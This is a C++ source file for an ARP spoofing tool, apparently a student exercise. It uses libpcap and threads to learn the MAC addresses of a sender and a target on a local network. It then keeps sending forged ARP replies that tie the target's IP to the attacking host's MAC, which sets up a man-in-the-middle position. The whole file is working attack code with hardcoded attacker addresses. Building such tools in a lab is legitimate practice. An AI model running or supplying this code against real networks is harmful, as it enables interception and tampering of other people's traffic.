#include <cstdio>
#include <unistd.h>
#include <pthread.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp_spoof.h"

void usage()
{
	printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char *argv[])
{
	if (argc < 4 || argc % 2 != 0)
	{
		usage();
		return -1;
	}

	char *interface = argv[1];
	char *sender_ip = argv[2];
	char *target_ip = argv[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf); // BUFSIZ 8192
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}

	Mac myMac = Mac("00:93:37:BF:F8:A1"); // host's mac
	Ip myIp = Ip("10.1.1.109");			  // vm's ip
	Mac smac, tmac;
	Ip sip = Ip(sender_ip);
	Ip tip = Ip(target_ip);

	int status;

	ArpReqs SarpReqs = ArpReqs(myMac, smac, myIp, sip);
	ArpTArgs *SArpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
	SArpTArgs->pcap_ = pcap;
	SArpTArgs->arpReqs_ = SarpReqs;
	ArpReqs TarpReqs = ArpReqs(myMac, tmac, myIp, tip);
	ArpTArgs *TArpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
	TArpTArgs->pcap_ = pcap;
	TArpTArgs->arpReqs_ = TarpReqs;

	pthread_t arpReqT[2];

	pthread_create(&arpReqT[0], NULL, t_get_mac_via_arp, (void *)SArpTArgs);
	pthread_create(&arpReqT[1], NULL, t_get_mac_via_arp, (void *)TArpTArgs);

	for (int i = 0; i < 2; i++)
		pthread_join(arpReqT[i], (void **)&status);
	smac = SArpTArgs->retMac_;
	tmac = TArpTArgs->retMac_;

	printf("sender mac:  %s\n", std::string(smac).c_str());
	printf("target mac:  %s\n", std::string(tmac).c_str());

	ArpReqs arpReqs = ArpReqs(myMac, smac, tip, sip);

	ArpTArgs *arpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
	arpTArgs->pcap_ = pcap;
	arpTArgs->arpReqs_ = arpReqs;

	int thr_id;
	pthread_t pthread;
	thr_id = pthread_create(&pthread, NULL, t_send_arp_replys, (void *)arpTArgs);
	if (thr_id < 0)
	{
		perror("pthread0 create error");
		exit(EXIT_FAILURE);
	}

	// printf("arpreqs %s\n", std::string(arpReqs.smac_).c_str());
	pthread_join(pthread, (void **)&status);

	pcap_close(pcap);
}
